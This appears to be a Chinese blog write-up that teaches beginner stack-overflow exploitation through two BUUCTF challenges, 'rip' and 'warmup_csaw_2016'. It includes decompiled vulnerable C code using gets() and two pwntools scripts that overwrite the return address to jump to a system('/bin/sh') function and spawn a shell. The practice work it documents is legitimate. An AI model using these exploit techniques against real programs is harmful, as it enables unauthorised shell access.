---
title: PWN入门浅记
index: true
icon: codicon:note
category:
  - CTF
  - Writeup
  - Pwn
tag:
  - CTF
  - Pwn
  - Writeup
  - 栈溢出
---

最近一直很想研究一下pwn，但一直没借口去学。借着最近ISCTF的势头，是时候学一些pwn了。  
那么就拿buuctf上的一些题为练习题，大概学习一下栈溢出的操作吧。

<!-- more -->

# 环境搭建

我用的是wsl2，安装的ubuntu，照着网上的教程安装了gdb，pwntool等一堆工具。  
IDA pro也是必须要有的，用于静态分析。  
那么首先拿buuctf的第二道题为例，大概写一下我的做题思路罢。

# rip 题解

首先用IDA打开下载的pwn1，大概看一下main函数的内容。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[15]; // [rsp+1h] [rbp-Fh] BYREF

  puts("please input");
  gets(s, argv);
  puts(s);
  puts("ok,bye!!!");
  return 0;
}
```

可以看到，变量s长度被定义为15，但gets函数并未检查输入的字符长度，很容易发生数组越界。  
同时，在左边函数列表中还有一个fun函数.

```c
int fun()
{
  return system("/bin/sh");
}
```

当被调用时会返回system(‘/bin/sh’)运行后的内容，也就是启动shell。现在，我们需要找到fun函数的地址。幸运的是，IDA的函数列表中就有这个函数的地址0x401186。  
那么，现在我们就有构造payload的思路了：首先用15个垃圾字符填充满变量s，然后传入fun函数的地址0x401186，这样我们就实现了在不改动代码的前提下调用fun函数的目标。

用python写一下攻击脚本。

```python
from pwn import *

context(arch='amd64', os='linux')
p=process('./pwn1 (2)')
#p=remote('node5.buuoj.cn',29769)
payload = b'A'*15
shell_address = 0x401186
payload += p64(shell_address)

p.sendline(payload)
p.interactive()
```

攻击时把第二个p的注释取消掉，把第一个p注释掉再运行脚本，这样就能拿到远程服务器的shell了。  
拿到shell权限，默认在根目录，ls一下就能看到flag文件。直接cat flag就能得到flag。

# warmup\_csaw\_2016 题解

这个跟rip思路差不多。都是触发栈溢出，然后传入目标函数的地址。要触发栈溢出只用填进去72个垃圾字符就够了。目标函数的地址在ida里就能轻易找到，是0x40060D。  
payload跟rip也差不多，代码放出来参考：

```python
from pwn import *

context(log_level='debug',arch='amd64', os='linux')
p=process('./warmup_csaw_2016')
#p=remote('node5.buuoj.cn',26098)
payload = b'A'*72
shell_address = 0x40060D
payload += p64(shell_address)

p.sendline(payload)
p.interactive()
```
